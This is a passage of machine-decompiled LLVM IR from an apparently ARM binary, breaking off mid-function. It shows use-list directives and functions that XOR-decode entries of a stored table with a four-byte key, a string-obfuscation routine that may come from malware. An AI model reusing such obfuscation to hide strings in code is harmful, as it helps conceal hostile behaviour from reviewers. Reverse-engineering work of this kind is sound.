  uselistorder i1* %cpsr_z.global-to-local, { 9, 55, 103, 102, 104, 105, 106, 10, 11, 78, 79, 80, 81, 82, 0, 1, 6, 7, 2, 3, 4, 5, 8, 97, 12, 13, 14, 136, 15, 16, 17, 18, 19, 20, 25, 26, 21, 22, 23, 24, 27, 28, 29, 34, 35, 30, 31, 32, 33, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 52, 53, 48, 49, 50, 51, 54, 56, 57, 67, 68, 58, 65, 66, 69, 99, 70, 75, 76, 71, 72, 73, 74, 77, 98, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 194, 107, 108, 109, 110, 111, 112, 64, 195, 100, 101, 113, 115, 114, 116, 117, 119, 121, 120, 196, 118, 122, 123, 124, 125, 126, 127, 132, 128, 129, 130, 131, 61, 62, 59, 60, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 155, 153, 154, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 135, 172, 173, 174, 175, 176, 134, 177, 178, 179, 133, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 63, 193 }
  uselistorder i1* %cpsr_c.global-to-local, { 9, 10, 11, 57, 102, 101, 103, 104, 105, 12, 80, 81, 82, 83, 0, 1, 6, 7, 2, 3, 4, 5, 8, 96, 13, 14, 15, 134, 16, 17, 18, 19, 20, 21, 22, 27, 28, 23, 24, 25, 26, 29, 30, 31, 36, 37, 32, 33, 34, 35, 38, 39, 40, 45, 46, 41, 42, 43, 44, 47, 48, 49, 54, 55, 50, 51, 52, 53, 56, 58, 59, 69, 70, 60, 67, 68, 71, 98, 72, 77, 78, 73, 74, 75, 76, 79, 97, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 192, 106, 107, 108, 109, 110, 111, 66, 194, 99, 100, 112, 114, 113, 115, 116, 118, 120, 119, 195, 117, 121, 122, 123, 124, 125, 130, 126, 127, 128, 129, 63, 64, 61, 135, 62, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 133, 167, 168, 169, 170, 171, 132, 172, 173, 174, 131, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 65, 193 }
  uselistorder i32 (i32)* @function_10120, { 1, 0 }
  uselistorder i32 104, { 0, 3, 1, 4, 2, 5 }
  uselistorder i8 31, { 7, 1, 2, 0, 3, 4, 8, 5, 6, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i32)* @function_122b4, { 39, 38, 40, 37, 36, 35, 34, 33, 32, 31, 41, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @function_12288, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 61, 62, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 60, 56, 57, 58, 59 }
  uselistorder i32 (i32)* @function_1236c, { 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_15f10.34 to i32*), { 4, 2, 3, 1, 0, 6, 5 }
  uselistorder [3 x i8]* @global_var_15f10.34, { 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_15f10.34 to i32), { 16, 17, 18, 19, 20, 21, 22, 12, 23, 3, 24, 15, 25, 13, 26, 14, 27, 0, 28, 1, 29, 2, 30, 4, 31, 5, 32, 6, 33, 7, 34, 8, 35, 9, 36, 10, 37, 11, 38 }
  uselistorder i8 58, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 57, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 62, { 6, 4, 5, 3, 2, 1, 0 }
  uselistorder i8 61, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 37, { 5, 3, 4, 2, 1, 0 }
  uselistorder i8 34, { 6, 4, 5, 3, 2, 1, 0, 7, 8, 9, 10 }
  uselistorder i8 36, { 11, 12, 7, 8, 9, 10, 5, 6, 3, 4, 2, 0, 1 }
  uselistorder i8 35, { 12, 13, 8, 9, 10, 11, 6, 7, 4, 5, 2, 3, 0, 1 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_13ec0, { 2, 3, 4, 5, 6, 7, 8, 22, 0, 1, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 24, 25, 23, 19, 26, 27, 28, 29, 20, 21, 30 }
  uselistorder i32 251, { 3, 4, 5, 0, 1, 2 }
  uselistorder i8 -3, { 1, 2, 3, 0 }
  uselistorder i8 -4, { 1, 2, 3, 0 }
  uselistorder i32 1073741824, { 2, 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32)* @function_13e60, { 5, 2, 3, 4, 0, 1, 6, 9, 7, 8 }
  uselistorder i32 (i32, i32, i32, i32)* @function_12d58, { 22, 24, 23, 21, 20, 19, 18, 17, 16, 5, 4, 3, 2, 1, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6 }
  uselistorder i8* bitcast (i8** @global_var_1ec30.191 to i8*), { 4, 0, 3, 2, 1 }
  uselistorder i8* @global_var_1ec31.192, { 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1ec30.191 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @function_13e04, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_13874, { 1, 2, 3, 0 }
  uselistorder i32 284, { 3, 4, 5, 6, 0, 1, 2, 7 }
  uselistorder i32 1544, { 1, 0 }
  uselistorder i32 1672, { 2, 0, 1 }
  uselistorder i32 ()* @function_106a4, { 3, 2, 1, 0 }
  uselistorder i8 2, { 0, 2, 4, 3, 1 }
  uselistorder i32 5888, { 1, 0 }
  uselistorder i32 (i32, i32*, i32, i32, i32, i32)* @function_13e8c, { 2, 0, 1 }
  uselistorder i32 (i32, i32*, i32, i32, i32, i32)* @function_13eec, { 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 16384, { 32, 52, 33, 53, 34, 54, 35, 55, 36, 56, 37, 57, 13, 58, 12, 69, 11, 50, 0, 51, 1, 59, 2, 60, 3, 61, 4, 62, 5, 63, 6, 64, 7, 65, 8, 66, 30, 67, 31, 68, 28, 71, 29, 72, 27, 70, 38, 91, 9, 92, 10, 93, 14, 80, 39, 81, 16, 73, 42, 74, 41, 75, 43, 76, 44, 77, 15, 78, 40, 79, 17, 82, 18, 83, 19, 84, 45, 46, 20, 85, 21, 86, 23, 87, 22, 88, 24, 89, 25, 90, 48, 94, 49, 95, 26, 96, 47, 97 }
  uselistorder i32 (i32, i32, i32, i32)* @function_e480, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @function_1347c, { 1, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32)* @function_e424, { 2, 10, 9, 8, 7, 6, 5, 4, 3, 1, 0 }
  uselistorder i8* @global_var_1ec14.314, { 2, 1, 0 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 223, { 3, 0, 1, 2 }
  uselistorder i32 192, { 2, 3, 4, 0, 1 }
  uselistorder i32 126, { 6, 7, 8, 14, 5, 0, 9, 1, 10, 2, 11, 3, 12, 4, 13 }
  uselistorder i32 ptrtoint (i32* @global_var_160ec.292 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_16084.270 to i32), { 0, 5, 1, 6, 2, 3, 4, 7 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_16068.264 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_16048.258 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_16040.256 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1602c.252 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_16018.248 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_16010.246 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_16008.244 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_15ffc.242 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_15f38.240 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_161b0.236 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_161a8.234 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_16184.226 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1617c.224 to i32), { 0, 18, 1, 19, 2, 20, 3, 21, 4, 22, 5, 23, 6, 24, 7, 25, 8, 26, 9, 27, 10, 28, 11, 29, 12, 30, 13, 31, 14, 15, 16, 32, 17, 33 }
  uselistorder i32 (i32, i32, i32)* @function_10778, { 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_16164.218 to i32), { 0, 34, 1, 35, 2, 36, 3, 37, 4, 38, 5, 39, 6, 40, 7, 41, 8, 42, 9, 43, 10, 44, 11, 45, 12, 46, 13, 47, 14, 48, 15, 49, 16, 50, 17, 51, 18, 52, 19, 53, 20, 54, 21, 22, 23, 55, 24, 56, 25, 57, 26, 58, 27, 59, 28, 60, 29, 61, 30, 62, 31, 63, 32, 64, 33, 65 }
  uselistorder i8* @global_var_1ec25.214, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1ec18.205 to i32), { 3, 2, 4, 5, 0, 6, 1, 7, 8 }
  uselistorder i8 64, { 6, 0, 1, 7, 2, 3, 4, 5 }
  uselistorder i8* @global_var_1ec24.206, { 1, 0 }
  uselistorder i8** @global_var_1ec04.201, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i8** @global_var_1ec04.201 to i32), { 0, 2, 1, 9, 8, 3, 7, 6, 5, 4 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 1023, { 4, 0, 1, 2, 5, 3, 6 }
  uselistorder i32 ()* @function_fe60, { 69, 12, 11, 10, 9, 8, 7, 66, 13, 68, 67, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 2, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @function_13f20, { 8, 0, 1, 2, 3, 4, 9, 5, 6, 7, 10 }
  uselistorder i32 2048, { 14, 13, 5, 8, 9, 0, 1, 2, 3, 7, 10, 6, 11, 4, 12, 15 }
  uselistorder i32* @global_var_1ec9c.199, { 1, 5, 2, 3, 4, 0 }
  uselistorder i32 127, { 3, 9, 4, 10, 5, 11, 12, 0, 1, 13, 7, 14, 2, 15, 6, 16, 8, 17 }
  uselistorder i32* @global_var_1ec98.197, { 1, 2, 3, 4, 0 }
  uselistorder i32 288, { 1, 2, 5, 6, 0, 7, 3, 4, 8 }
  uselistorder i32* @global_var_1ec34.185, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32 (i32*)* @function_13924, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9 }
  uselistorder i32* @global_var_1ec7c.86, { 3, 4, 2, 0, 5, 1, 6, 13, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* @global_var_1eca0.183, { 0, 2, 1 }
  uselistorder i32 ()* @function_13680, { 5, 2, 4, 3, 1, 0 }
  uselistorder i32* @fp, { 3, 4, 5, 6, 7, 48, 49, 41, 42, 43, 8, 9, 0, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 1, 38, 39, 40, 44, 2, 45, 46, 47 }
  uselistorder i32* @sl, { 2, 3, 4, 5, 6, 7, 80, 81, 64, 65, 66, 8, 11, 9, 10, 1, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 0, 104, 105, 106, 107 }
  uselistorder i32* @sb, { 3, 4, 7, 1, 2, 5, 6, 59, 58, 8, 9, 60, 61, 49, 50, 51, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 52, 53, 54, 55, 56, 57, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71 }
  uselistorder label %dec_label_pc_12280, { 1, 0 }
  uselistorder label %dec_label_pc_121dc, { 1, 0 }
  uselistorder label %dec_label_pc_12110, { 1, 0 }
  uselistorder label %dec_label_pc_1207c, { 2, 0, 1 }
  uselistorder label %bb344, { 1, 0 }
  uselistorder label %dec_label_pc_1203c, { 1, 0 }
  uselistorder label %dec_label_pc_11f08, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11ef4, { 1, 0 }
  uselistorder label %dec_label_pc_11e9c, { 2, 3, 1, 11, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_11e80, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11cfc, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11ce8, { 1, 0 }
  uselistorder label %dec_label_pc_11c48, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11c34, { 1, 0 }
  uselistorder label %dec_label_pc_11b94, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11b80, { 1, 0 }
  uselistorder label %dec_label_pc_11ae0, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11acc, { 1, 0 }
  uselistorder label %dec_label_pc_11a54, { 1, 0 }
  uselistorder label %dec_label_pc_11a48, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11a34, { 1, 0 }
  uselistorder label %dec_label_pc_118b8, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_118a4, { 1, 0 }
  uselistorder label %dec_label_pc_11860, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_11850, { 6, 2, 3, 4, 1, 0, 5 }
  uselistorder label %bb318, { 2, 1, 0 }
  uselistorder label %bb315, { 2, 1, 0 }
  uselistorder label %dec_label_pc_117b0, { 1, 0 }
  uselistorder label %dec_label_pc_117b0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_11738, { 1, 0 }
  uselistorder label %bb312, { 1, 0 }
  uselistorder label %dec_label_pc_116e8, { 1, 0 }
  uselistorder label %dec_label_pc_116d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_116d0thread-pre-split, { 4, 5, 3, 7, 2, 6, 1, 8, 0, 9 }
  uselistorder label %dec_label_pc_116d0thread-pre-split.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_116d8.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_116cc.loopexit, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1168c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11568, { 6, 7, 3, 4, 0, 5, 1, 2 }
  uselistorder label %dec_label_pc_11544, { 1, 0 }
  uselistorder label %bb309, { 1, 0 }
  uselistorder label %bb307, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_113ac.dec_label_pc_113ac_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_11390.dec_label_pc_11390_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_11388, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_11380, { 1, 0 }
  uselistorder label %dec_label_pc_11334, { 1, 0 }
  uselistorder label %dec_label_pc_111d4, { 10, 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 11 }
  uselistorder label %dec_label_pc_111c8, { 1, 0 }
  uselistorder label %.thread47, { 2, 1, 0 }
  uselistorder label %.thread45, { 1, 0 }
  uselistorder label %dec_label_pc_1102c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_11008, { 1, 0 }
  uselistorder label %dec_label_pc_10ffc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10fd8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10fb4, { 1, 0 }
  uselistorder label %bb279, { 1, 0 }
  uselistorder label %dec_label_pc_10f60, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_10a44, { 1, 0 }
}

define i32 @function_12288(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_12288:
  %v3_1228c = mul i32 %arg1, 8
  %v2_12290 = add i32 %v3_1228c, ptrtoint (i32* @global_var_1eca8.336 to i32)
  %v2_12294 = icmp eq i32* %arg2, null
  br i1 %v2_12294, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_12288
  %v3_122a011 = inttoptr i32 %v2_12290 to i32*
  %v4_122a012 = load i32, i32* %v3_122a011, align 4
  br label %bb15

bb:                                               ; preds = %dec_label_pc_12288
  %v2_12298 = add i32 %v3_1228c, add (i32 ptrtoint (i32* @global_var_1eca8.336 to i32), i32 5)
  %v3_12298 = inttoptr i32 %v2_12298 to i8*
  %v4_12298 = load i8, i8* %v3_12298, align 1
  %v5_12298 = zext i8 %v4_12298 to i32
  store i32 %v5_12298, i32* @r2, align 4
  %v2_1229c = add i32 %v3_1228c, add (i32 ptrtoint (i32* @global_var_1eca8.336 to i32), i32 4)
  %v3_1229c = inttoptr i32 %v2_1229c to i8*
  %v4_1229c = load i8, i8* %v3_1229c, align 4
  %v5_1229c = zext i8 %v4_1229c to i32
  %v3_122a0 = inttoptr i32 %v2_12290 to i32*
  %v4_122a0 = load i32, i32* %v3_122a0, align 4
  %v5_122a4 = mul nuw nsw i32 %v5_12298, 256
  %v6_122a4 = or i32 %v5_1229c, %v5_122a4
  store i32 %v6_122a4, i32* %arg2, align 4
  br label %bb15

bb15:                                             ; preds = %.thread, %bb
  %v4_122a0714 = phi i32 [ %v4_122a012, %.thread ], [ %v4_122a0, %bb ]
  ret i32 %v4_122a0714

; uselistorder directives
  uselistorder i32 %v2_12290, { 1, 0 }
  uselistorder i32 %v3_1228c, { 2, 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_122b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_122b4:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_122b4 = mul i32 %arg1, 8
  %v3_122b8 = load i32, i32* @r4, align 4
  store i32 %v3_122b8, i32* %stack_var_-20, align 4
  %v3_122c8 = and i32 %v3_122b4, 2040
  %v2_122cc = add i32 %v3_122c8, ptrtoint (i32* @global_var_1eca8.336 to i32)
  store i32 %v2_122cc, i32* @lr, align 4
  %v1_122d4 = add i32 %v3_122c8, add (i32 ptrtoint (i32* @global_var_1eca8.336 to i32), i32 4)
  store i32 %v1_122d4, i32* %r7.global-to-local, align 4
  %v2_122d8 = load i32, i32* @global_var_1ea5c.339, align 4
  %v2_122dc = inttoptr i32 %v1_122d4 to i8*
  %v3_122dc = load i8, i8* %v2_122dc, align 4
  %v4_122dc = zext i8 %v3_122dc to i32
  store i32 %v4_122dc, i32* @r1, align 4
  %v1_122e0 = add i32 %v3_122c8, add (i32 ptrtoint (i32* @global_var_1eca8.336 to i32), i32 5)
  %v2_122e0 = inttoptr i32 %v1_122e0 to i8*
  %v3_122e0 = load i8, i8* %v2_122e0, align 1
  %v4_122e0 = zext i8 %v3_122e0 to i32
  %v3_122e4 = udiv i32 %v2_122d8, 256
  %v4_122e8 = mul nuw nsw i32 %v4_122e0, 256
  %v5_122e8 = or i32 %v4_122e8, %v4_122dc
  %v7_122e8 = icmp eq i32 %v5_122e8, 0
  store i1 %v7_122e8, i1* @cpsr_z, align 1
  %v3_122ec = udiv i32 %v2_122d8, 65536
  %v1_122f0 = urem i32 %v3_122e4, 256
  store i32 %v1_122f0, i32* %r6.global-to-local, align 4
  %v1_122f4 = urem i32 %v3_122ec, 256
  store i32 %v1_122f4, i32* %r5.global-to-local, align 4
  %v3_122f8 = udiv i32 %v2_122d8, 16777216
  store i32 %v3_122f8, i32* %r4.global-to-local, align 4
  %v1_122fc = urem i32 %v2_122d8, 256
  br i1 %v7_122e8, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_122b4
  store i32 %v3_122b8, i32* @r4, align 4
  ret i32 %v1_122fc

bb8:                                              ; preds = %dec_label_pc_122b4
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12308

dec_label_pc_12308:                               ; preds = %dec_label_pc_12308, %bb8
  %v2_12314 = phi i32 [ %v1_12350, %dec_label_pc_12308 ], [ 0, %bb8 ]
  %v0_12308 = phi i32 [ %v0_12348, %dec_label_pc_12308 ], [ %v2_122cc, %bb8 ]
  %v1_12308 = inttoptr i32 %v0_12308 to i32*
  %v2_12308 = load i32, i32* %v1_12308, align 4
  %v2_1230c = add i32 %v2_12308, %v2_12314
  %v3_1230c = inttoptr i32 %v2_1230c to i8*
  %v4_1230c = load i8, i8* %v3_1230c, align 1
  %v6_1230c = zext i8 %v4_1230c to i32
  %v2_12310 = xor i32 %v6_1230c, %v1_122fc
  %v1_12314 = trunc i32 %v2_12310 to i8
  store i8 %v1_12314, i8* %v3_1230c, align 1
  %v0_12318 = load i32, i32* @lr, align 4
  %v1_12318 = inttoptr i32 %v0_12318 to i32*
  %v2_12318 = load i32, i32* %v1_12318, align 4
  %v0_1231c = load i32, i32* %ip.global-to-local, align 4
  %v2_1231c = add i32 %v0_1231c, %v2_12318
  %v3_1231c = inttoptr i32 %v2_1231c to i8*
  %v4_1231c = load i8, i8* %v3_1231c, align 1
  %v6_1231c = zext i8 %v4_1231c to i32
  %v0_12320 = load i32, i32* %r6.global-to-local, align 4
  %v2_12320 = xor i32 %v0_12320, %v6_1231c
  %v1_12324 = trunc i32 %v2_12320 to i8
  store i8 %v1_12324, i8* %v3_1231c, align 1
  %v0_12328 = load i32, i32* @lr, align 4
  %v1_12328 = inttoptr i32 %v0_12328 to i32*
  %v2_12328 = load i32, i32* %v1_12328, align 4
  %v0_1232c = load i32, i32* %ip.global-to-local, align 4
  %v2_1232c = add i32 %v0_1232c, %v2_12328
  %v3_1232c = inttoptr i32 %v2_1232c to i8*
  %v4_1232c = load i8, i8* %v3_1232c, align 1
  %v6_1232c = zext i8 %v4_1232c to i32
  %v0_12330 = load i32, i32* %r5.global-to-local, align 4
  %v2_12330 = xor i32 %v0_12330, %v6_1232c
  %v1_12334 = trunc i32 %v2_12330 to i8
  store i8 %v1_12334, i8* %v3_1232c, align 1
  %v0_12338 = load i32, i32* @lr, align 4
  %v1_12338 = inttoptr i32 %v0_12338 to i32*
  %v2_12338 = load i32, i32* %v1_12338, align 4
  store i32 %v2_12338, i32* @r1, align 4
  %v0_1233c = load i32, i32* %ip.global-to-local, align 4
  %v2_1233c = add i32 %v0_1233c, %v2_12338
  %v3_1233c = inttoptr i32 %v2_1233c to i8*
  %v4_1233c = load i8, i8* %v3_1233c, align 1
  %v6_1233c = zext i8 %v4_1233c to i32
  %v0_12340 = load i32, i32* %r4.global-to-local, align 4
  %v2_12340 = xor i32 %v0_12340, %v6_1233c
  %v1_12344 = trunc i32 %v2_12340 to i8
  store i8 %v1_12344, i8* %v3_1233c, align 1
  %v0_12348 = load i32, i32* @lr, align 4
  %v1_12348 = add i32 %v0_12348, 4
  %v2_12348 = inttoptr i32 %v1_12348 to i8*
  %v3_12348 = load i8, i8* %v2_12348, align 1
  %v4_12348 = zext i8 %v3_12348 to i32
  %v0_1234c = load i32, i32* %r7.global-to-local, align 4
  %v1_1234c = add i32 %v0_1234c, 1
  %v2_1234c = inttoptr i32 %v1_1234c to i8*
  %v3_1234c = load i8, i8* %v2_1234c, align 1
  %v4_1234c = zext i8 %v3_1234c to i32
  %v0_12350 = load i32, i32* %ip.global-to-local, align 4
  %v1_12350 = add i32 %v0_12350, 1
  store i32 %v1_12350, i32* %ip.global-to-local, align 4
  %v4_12354 = mul nuw nsw i32 %v4_1234c, 256
  %v5_12354 = or i32 %v4_12354, %v4_12348
  %v9_12358 = icmp eq i32 %v5_12354, %v1_12350
  store i1 %v9_12358, i1* @cpsr_z, align 1
  %v8_1235c = icmp sgt i32 %v5_12354, %v1_12350
  br i1 %v8_1235c, label %dec_label_pc_12308, label %dec_label_pc_12360

dec_label_pc_12360:                               ; preds = %dec_label_pc_12308
  %v2_12360 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12360, i32* @r4, align 4
  ret i32 %v1_122fc

; uselistorder directives
  uselistorder i32 %v1_12350, { 1, 2, 3, 0 }
  uselistorder i32 %v0_12348, { 1, 0 }
  uselistorder i32 %v1_122fc, { 0, 2, 1 }
  uselistorder i32 %v2_122d8, { 3, 0, 1, 2 }
}

define i32 @function_1236c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1236c:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1236c = mul i32 %arg1, 8
  %v3_12370 = load i32, i32* @r4, align 4
  store i32 %v3_12370, i32* %stack_var_-20, align 4
  %v3_12380 = and i32 %v3_1236c, 2040
  %v2_12384 = add i32 %v3_12380, ptrtoint (i32* @global_var_1eca8.336 to i32)
  store i32 %v2_12384, i32* @lr, align 4
  %v1_1238c = add i32 %v3_12380, add (i32 ptrtoint (i32* @global_var_1eca8.336 to i32), i32 4)
  store i32 %v1_1238c, i32* %r7.global-to-local, align 4
  %v2_12390 = load i32, i32* @global_var_1ea5c.339, align 4
  store i32 %v2_12390, i32* @r2, align 4
  %v2_12394 = inttoptr i32 %v1_1238c to i8*
  %v3_12394 = load i8, i8* %v2_12394, align 4
  %v4_12394 = zext i8 %v3_12394 to i32
  %v1_12398 = add i32 %v3_12380, add (i32 ptrtoint (i32* @global_var_1eca8.336 to i32), i32 5)
  %v2_12398 = inttoptr i32 %v1_12398 to i8*
  %v3_12398 = load i8, i8* %v2_12398, align 1
  %v4_12398 = zext i8 %v3_12398 to i32
  %v3_1239c = udiv i32 %v2_12390, 256
  %v4_123a0 = mul nuw nsw i32 %v4_12398, 256
  %v5_123a0 = or i32 %v4_123a0, %v4_12394
  %v7_123a0 = icmp eq i32 %v5_123a0, 0
  %v3_123a4 = udiv i32 %v2_12390, 65536
  %v1_123a8 = urem i32 %v3_1239c, 256
  store i32 %v1_123a8, i32* %r6.global-to-local, align 4
  %v1_123ac = urem i32 %v3_123a4, 256
  store i32 %v1_123ac, i32* %r5.global-to-local, align 4
  %v3_123b0 = udiv i32 %v2_12390, 16777216
  store i32 %v3_123b0, i32* %r4.global-to-local, align 4
  %v1_123b4 = urem i32 %v2_12390, 256
  br i1 %v7_123a0, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_1236c
  store i32 %v3_12370, i32* @r4, align 4
  ret i32 %v1_123b4

bb8:                                              ; preds = %dec_label_pc_1236c
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_123c0

dec_label_pc_123c0:                               ; preds = %dec_label_pc_123c0, %bb8
  %v2_123cc = phi i32 [ %v1_12408, %dec_label_pc_123c0 ], [ 0, %bb8 ]
  %v0_123c0 = phi i32 [ %v0_12400, %dec_label_pc_123c0 ], [ %v2_12384, %bb8 ]
  %v1_123c0 = inttoptr i32 %v0_123c0 to i32*
